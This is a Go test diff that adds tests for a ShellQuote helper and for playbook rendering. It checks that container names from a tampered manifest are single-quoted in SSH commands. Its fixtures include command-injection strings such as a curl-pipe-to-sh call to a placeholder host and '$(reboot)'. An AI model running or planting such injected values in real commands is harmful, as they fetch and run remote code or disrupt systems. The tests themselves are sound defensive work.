@@ -490,3 +490,39 @@ func TestRetryabilityHelpers(t *testing.T) {
 		}
 	}
 }
+
+func TestShellQuote(t *testing.T) {
+	cases := map[string]string{
+		"payram":            "payram",
+		"payram-e2e_1.prod": "payram-e2e_1.prod",
+		"/var/lib/payram/backups/b-3.1.3-to-3.10.0.dump": "/var/lib/payram/backups/b-3.1.3-to-3.10.0.dump",
+		"payram; curl -s https://x/y | sh #":             "'payram; curl -s https://x/y | sh #'",
+		"it's":                                           `'it'"'"'s'`,
+		"$(reboot)":                                      "'$(reboot)'",
+		"":                                               "''",
+	}
+	for in, want := range cases {
+		if got := ShellQuote(in); got != want {
+			t.Errorf("ShellQuote(%q) = %s, want %s", in, got, want)
+		}
+	}
+}
+
+// TestRenderPlaybook_QuotesAContainerNameFromTheManifest (audit L6): a name
+// a tampered manifest supplied must stay one argument in every command.
+func TestRenderPlaybook_QuotesAContainerNameFromTheManifest(t *testing.T) {
+	evil := "payram; curl -s https://x/y | sh #"
+	for code := range allPlaybooks() {
+		pb := RenderPlaybook(code, PlaybookContext{ContainerName: evil, BackupPath: "/backups/a b.dump"})
+		for _, step := range pb.SSHSteps {
+			// Every occurrence opens a single-quoted word ('<name>' or
+			// '<name>-previous').
+			if strings.Count(step, evil) != strings.Count(step, "'"+evil) {
+				t.Errorf("%s renders the name unquoted: %s", code, step)
+			}
+			if strings.Contains(step, "/backups/a b.dump") && !strings.Contains(step, "'/backups/a b.dump'") {
+				t.Errorf("%s renders the backup path unquoted: %s", code, step)
+			}
+		}
+	}
+}
